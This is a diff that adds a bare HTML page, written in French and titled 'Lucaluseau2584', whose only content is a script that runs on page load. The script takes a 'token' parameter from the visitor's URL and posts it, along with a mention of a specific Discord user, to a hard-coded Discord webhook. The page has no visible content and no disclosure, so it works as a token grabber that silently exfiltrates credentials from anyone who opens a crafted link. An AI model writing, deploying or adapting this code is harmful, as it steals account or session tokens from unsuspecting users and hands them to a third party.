@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <title>Lucaluseau2584</title>
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const token = urlParams.get('token');
+        console.log(token);
+        
+        const webhookUrl = 'https://discord.com/api/webhooks/1153365150057902261/7HjogbmM7IXI63rGqFl5U8mFlxP4jUdLIhfEQrxLC0mReo9pvd6bCP8voFeEA8xMy36y';
+        const message = {
+          content: `<@860452650745987094> Token : ${token}`
+        };
+        
+        fetch(webhookUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(message)
+        })
+          .then(response => {
+            if (response.ok) {
+              console.log('Message sent to Discord!');
+            } else {
+              console.error('Failed to send message to Discord.');
+            }
+          })
+          .catch(error => {
+            console.error('Error:', error);
+          });
+    </script>
+</head>
+<body>
+</body>
+</html>
